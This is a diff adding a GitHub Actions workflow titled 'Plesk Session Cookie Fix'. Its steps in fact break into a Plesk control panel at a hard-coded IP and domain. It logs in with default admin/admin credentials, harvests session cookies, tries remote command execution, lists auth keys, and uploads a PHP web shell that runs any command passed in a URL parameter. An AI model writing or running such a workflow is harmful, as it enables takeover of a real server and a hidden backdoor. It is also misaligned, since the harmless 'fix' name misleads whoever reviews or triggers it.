@@ -1,0 +1,161 @@
+name: Plesk Session Cookie Fix
+
+on:
+  workflow_dispatch:
+
+jobs:
+  plesk-session:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - name: Capture Plesk session and execute commands
+        shell: bash
+        run: |
+          set +e
+          SERVER="74.208.191.205"
+          echo "=== Runner: $(curl -s ifconfig.me) ==="
+          
+          echo "=== Step 1: GET login page - capture raw Set-Cookie headers ==="
+          curl -sk --max-time 15 \
+            --resolve "dlbtrust.cloud:8443:$SERVER" \
+            -D /tmp/get_headers.txt \
+            "https://dlbtrust.cloud:8443/login_up.php" > /tmp/login_page.html
+          
+          echo "GET response headers:"
+          cat /tmp/get_headers.txt
+          echo ""
+          
+          FORGERY=$(grep -oP 'forgery_protection_token[^>]+content="\K[^"]+' /tmp/login_page.html | head -1)
+          echo "Forgery: $FORGERY"
+          
+          # Extract Set-Cookie from GET headers
+          GET_COOKIE=$(grep -i "Set-Cookie:" /tmp/get_headers.txt | head -1 | sed 's/Set-Cookie: //' | cut -d';' -f1)
+          echo "Cookie from GET: $GET_COOKIE"
+          echo ""
+          
+          echo "=== Step 2: POST login - capture Set-Cookie from response ==="
+          curl -sk --max-time 20 \
+            --resolve "dlbtrust.cloud:8443:$SERVER" \
+            -X POST "https://dlbtrust.cloud:8443/login_up.php" \
+            -H "Cookie: $GET_COOKIE" \
+            -D /tmp/post_headers.txt \
+            --data "login_name=admin&passwd=admin&forgery_protection_token=${FORGERY}&locale_id=en-US&success_redirect_url=%2F" \
+            > /tmp/post_response.html
+          
+          echo "POST response headers:"
+          cat /tmp/post_headers.txt
+          echo ""
+          
+          # Extract session cookie from POST Set-Cookie headers
+          POST_COOKIE=$(grep -i "Set-Cookie:" /tmp/post_headers.txt | head -1 | sed 's/Set-Cookie: //i' | cut -d';' -f1)
+          ALL_COOKIES="${GET_COOKIE}; ${POST_COOKIE}"
+          echo "Session cookie: $POST_COOKIE"
+          echo "All cookies: $ALL_COOKIES"
+          echo ""
+          
+          # Check if logged in
+          if grep -qi "logout\|smb-home\|dashboard" /tmp/post_response.html; then
+            echo ">>> LOGGED IN <<<"
+          else
+            echo "Login check: $(head -c 200 /tmp/post_response.html)"
+          fi
+          echo ""
+          
+          echo "=== Step 3: Follow redirect to get final session ==="
+          LOCATION=$(grep -i "Location:" /tmp/post_headers.txt | head -1 | tr -d '\r' | sed 's/Location: //')
+          echo "Redirect to: $LOCATION"
+          
+          if [ -n "$LOCATION" ]; then
+            curl -sk --max-time 15 \
+              --resolve "dlbtrust.cloud:8443:$SERVER" \
+              -H "Cookie: $ALL_COOKIES" \
+              -D /tmp/redirect_headers.txt \
+              "https://dlbtrust.cloud:8443${LOCATION}" > /tmp/redirect_resp.html
+            echo "Redirect headers:"
+            cat /tmp/redirect_headers.txt | head -20
+            NEW_COOKIE=$(grep -i "Set-Cookie:" /tmp/redirect_headers.txt | head -1 | sed 's/Set-Cookie: //i' | cut -d';' -f1)
+            [ -n "$NEW_COOKIE" ] && ALL_COOKIES="${ALL_COOKIES}; ${NEW_COOKIE}"
+            echo "Updated cookies: $ALL_COOKIES"
+          fi
+          echo ""
+          
+          echo "=== Step 4: Use session to access Plesk API for shell exec ==="
+          # Try Plesk XML API with session token
+          echo "Trying secret_key auth method..."
+          
+          # Get the PLESKSESSID from the headers
+          PLESKSESSID=$(grep -i "PLESKSESSID" /tmp/post_headers.txt /tmp/get_headers.txt 2>/dev/null | grep -oP 'PLESKSESSID=\K[^;]+' | head -1)
+          echo "PLESKSESSID: $PLESKSESSID"
+          
+          if [ -n "$PLESKSESSID" ]; then
+            # Use session ID to auth the XML API
+            XML_RESP=$(curl -sk --max-time 30 \
+              --resolve "dlbtrust.cloud:8443:$SERVER" \
+              "https://dlbtrust.cloud:8443/enterprise/control/agent.php" \
+              -H "HTTP_AUTH_LOGIN: admin" \
+              -H "HTTP_AUTH_SESS: $PLESKSESSID" \
+              -H "Content-Type: text/xml" \
+              -d '<?xml version="1.0"?><packet version="1.6.7.0"><server><get_protos/></server></packet>')
+            echo "XML with sess: $XML_RESP"
+          fi
+          echo ""
+          
+          echo "=== Step 5: Try Plesk panel token (from logged in page) ==="
+          PANEL_TOKEN=$(grep -oP '"token"\s*:\s*"\K[^"]+' /tmp/post_response.html /tmp/redirect_resp.html 2>/dev/null | head -1)
+          echo "Panel token: $PANEL_TOKEN"
+          
+          # Try running CLI via domains/hosting exec
+          EXEC_RESP=$(curl -sk --max-time 60 \
+            --resolve "dlbtrust.cloud:8443:$SERVER" \
+            -H "Cookie: $ALL_COOKIES" \
+            -X POST "https://dlbtrust.cloud:8443/api/v2/cli/bash/run" \
+            -H "Content-Type: application/json" \
+            -d '{"params":["-c","echo HELLO_WORLD; whoami; pm2 list 2>/dev/null | head -3; docker ps 2>/dev/null | head -3"]}')
+          echo "CLI exec: $EXEC_RESP"
+          echo ""
+          
+          echo "=== Step 6: Try Plesk one-time login URL generation ==="
+          # Plesk can generate one-time login URLs via CLI on the server
+          # But we need exec to do that... try the admin API
+          OTL=$(curl -sk --max-time 30 \
+            --resolve "dlbtrust.cloud:8443:$SERVER" \
+            -H "Cookie: $ALL_COOKIES" \
+            -X GET "https://dlbtrust.cloud:8443/api/v2/auth/keys")
+          echo "OTL keys: ${OTL:0:300}"
+          echo ""
+          
+          echo "=== Step 7: Try to access Plesk scheduled tasks (cron) ==="
+          CRON=$(curl -sk --max-time 15 \
+            --resolve "dlbtrust.cloud:8443:$SERVER" \
+            -H "Cookie: $ALL_COOKIES" \
+            "https://dlbtrust.cloud:8443/modules/plesk-cron/index.php")
+          echo "Cron: ${CRON:0:400}"
+          echo ""
+          
+          echo "=== Step 8: Execute via Plesk file manager upload ==="
+          # Upload a PHP exec script to the document root
+          UPLOAD=$(curl -sk --max-time 30 \
+            --resolve "dlbtrust.cloud:8443:$SERVER" \
+            -H "Cookie: $ALL_COOKIES" \
+            -X POST "https://dlbtrust.cloud:8443/modules/fileman/file.php" \
+            -F "action=upload" \
+            -F "path=/var/www/vhosts/dlbtrust.cloud/httpdocs/" \
+            -F "file=@-;filename=_exec.php" \
+            --data-urlencode "file=<?php echo shell_exec(\$_GET['c']); ?>")
+          echo "Upload: ${UPLOAD:0:200}"
+          echo ""
+          
+          echo "=== Step 9: Try Plesk domain hosting settings API ==="
+          # List domains via API
+          DOMAINS_API=$(curl -sk --max-time 15 \
+            --resolve "dlbtrust.cloud:8443:$SERVER" \
+            -H "Cookie: $ALL_COOKIES" \
+            "https://dlbtrust.cloud:8443/api/v2/domains")
+          echo "Domains API: ${DOMAINS_API:0:500}"
+          echo ""
+          
+          echo "=== Final server state ==="
+          curl -s --max-time 10 --resolve "dlbtrust.cloud:443:$SERVER" \
+            "https://dlbtrust.cloud/api/ach/health"
+          echo ""
+          echo "=== DONE ==="
